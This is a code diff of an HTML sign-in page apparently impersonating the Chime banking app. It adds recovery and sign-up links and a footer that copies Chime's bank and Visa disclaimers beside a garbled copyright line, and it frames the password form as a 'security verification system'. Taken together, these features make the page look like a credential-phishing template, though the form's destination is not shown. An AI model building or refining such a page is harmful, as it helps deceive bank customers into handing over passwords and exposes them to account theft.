@@ -95,7 +95,7 @@ button:hover{
 <div class="page">
 <div class="card">
 
-<div class="brand">Chime@</div>
+<div class="brand">Chime<span></span></div>
 
 <form method="POST">
 
@@ -106,7 +106,7 @@ button:hover{
 
 <div class="pass-wrap">
 <input type="password" id="password" name="password" placeholder="Enter password" required>
-<span class="eye" onclick="togglePass()">👁</span>
+<span class="eye" onclick="togglePass()"></span>
 </div>
 
 <button type="submit">Sign in</button>
@@ -116,13 +116,33 @@ button:hover{
 <div class="info">
 By signing in, you agree to Chime security verification system.
 </div>
+<div class="link">
+
+<a href="#">forget email?</a><br>
+
+
+<a href="#">forget password?</a><br>
+
+
+Need account? <a href="#">sign up </a>
 
 </div>
+<div class="footer">
+
+© 2026 chime.chime.all Rights Reserved. 
+
+
+Banking Services provided by The Bancorp Bank, N.A., or Stride Bank, N.A., Members FDIC. The Chime Visa® Debit Card is issued by The Bancorp Bank, N.A., or Stride Bank pursuant to a license from Visa U.S.A. Inc. and may be used everywhere Visa debit cards are accepted. Please see back of your Card for its issuing bank.
+</div>
+
+</div>
+
 </div>
 
 <script>
 function togglePass(){
     const p = document.getElementById("password");
+
     if(p.type === "password"){
         p.type = "text";
     } else {
